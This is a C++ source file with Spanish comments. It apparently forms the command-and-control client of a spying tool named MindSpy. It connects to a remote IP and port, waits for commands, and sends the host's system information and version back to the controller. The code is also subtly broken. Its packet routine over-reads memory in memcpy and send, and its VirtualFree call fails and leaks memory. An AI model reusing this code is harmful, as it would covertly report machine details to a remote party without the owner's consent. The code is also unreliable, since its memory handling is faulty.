#include "Conector.h"

namespace MindSpy
{
	Conector::Conector(string IP, UINT32 Puerto) {
		// Inicializar sockets
		WSAStartup(MAKEWORD(2, 2), &wsd);
		// Crear un nuevo socket para el servidor donde se asigna IP, protocolo y puerto
		sckt = socket(AF_INET, SOCK_STREAM, 0);
		server.sin_addr.s_addr = inet_addr(IP.c_str());
		server.sin_family = AF_INET;
		server.sin_port = htons(Puerto);
		// Conectar al socket
		Conectado = connect(sckt, (sockaddr*)&server, sizeof(server)) != SOCKET_ERROR;
		// Iniciar el hilo de escucha
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HiloProc, (LPVOID)this, NULL, NULL);
	}

	Conector::~Conector() {
		// Cerrar el socket
		closesocket(sckt);
	}

	bool Conector::Listo()
	{
		return Conectado;
	}

	bool Conector::EnviarComando(USHORT SizeofData, USHORT comando, BYTE* Data)
	{
		/*
			La estructura de los paquetes a enviar, es siempre la misma, independientemente de
			los datos a enviar. Sin embargo, el tamaño de dichos datos puede variar.
			
			Los primeros dos bytes del paquete, corresponden al tamaño del paquete. Los segundos
			dos bytes corresponden al comando asociado a la data y del quinto byte en adelante,
			se ubica la data a enviar.
		*/

		// Se reserva memoria para el tamaño de la data + el opcode (comando) + data
		BYTE *DataToSend = (BYTE*)VirtualAlloc(NULL, SizeofData + 4, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		// Se mueven a los primeros 2 bytes (unsigned short), el tamaño del paquete
		*(USHORT*)DataToSend = SizeofData + 4;
		// Se mueve el comando a los siguientes 2 bytes
		*(USHORT*)(DataToSend + 2) = comando;
		// Se copia la data pasada por parámetro a la memoria reservada
		memcpy(DataToSend+4, Data, SizeofData + 4);
		// Se envian los datos
		bool r = send(sckt, (const char*)DataToSend, SizeofData+4 + 1, 0) != SOCKET_ERROR;
		// Se libera la memoria
		VirtualFree(DataToSend, SizeofData, MEM_RELEASE);
		return r;
	}

	int Conector::TipoComando(const char*c)
	{
		// Comandos disponibles
		char Comandos[CANTIDAD_COMANDOS][16] = { "CLOSE", "NAME", "VERSION", "SYSINFO" };
		// Se compara comando por comando y se regresa su ID, en caso de que exista
		for (int i = 0; i < CANTIDAD_COMANDOS; i++) {
			if (!strcmp(Comandos[i], c)) return i;
		}
		// Si no se encontró ninguno...
		return COMANDO_NO_EXISTENTE;
	}

	void Conector::Escuchar()
	{
		while (true)
		{
			char Mensaje[MAX_BUFFER];
			ZeroMemory(Mensaje, sizeof(Mensaje));
			int resp = recv(sckt, Mensaje, sizeof(Mensaje), 0);
			if (resp <= 0)
			{
				Conectado = false;
				break;
			}

			USHORT comando = *(USHORT*)(Mensaje+2);

			switch (comando)
			{
			case CLNT_CMDS::VERSION: 
				EnviarComando((USHORT)strlen(VERSION_CLIENTE) + 1, CLNT_CMDS::VERSION, (BYTE*)VERSION_CLIENTE);
				break;

			case CLNT_CMDS::SYSINFO:
				EnviarComando(sizeof(stSystemInfoResponse), CLNT_CMDS::SYSINFO, (BYTE*)&sys.getInfo());
				break;

			case CLNT_CMDS::CLOSE:
				EnviarComando(0, CLNT_CMDS::CLOSE, NULL);
				return;

			case CLNT_CMDS::NAME:
				break;
				 
			}
		}
	}
};